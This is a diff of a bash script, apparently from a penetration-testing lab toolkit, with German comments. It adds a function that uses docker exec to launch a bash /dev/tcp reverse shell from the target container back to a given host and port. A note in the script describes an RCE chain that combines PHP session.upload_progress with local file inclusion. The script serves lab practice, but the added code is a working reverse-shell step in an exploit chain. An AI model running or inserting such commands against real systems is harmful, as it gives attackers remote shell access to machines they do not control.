@@ -77,6 +77,13 @@ engage_lab_foothold_exec_rce() {
       -c "sh $script" 2>&1
 }
 
+# PHP beendet den Hintergrundprozess der RCE. Im Lab die Shell danach direkt im Target starten.
+engage_lab_foothold_direct_shell() {
+  local lhost="$1" lport="$2" c
+  c="$(engage_lab_foothold_container)"
+  docker exec -d "$c" bash -c "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"
+}
+
 engage_lab_foothold_note() {
   cat <<'NOTE'
 [foothold-lab] RCE-Kette (session.upload_progress + LFI) → Ziel führt bash /dev/tcp Reverse-Shell aus.
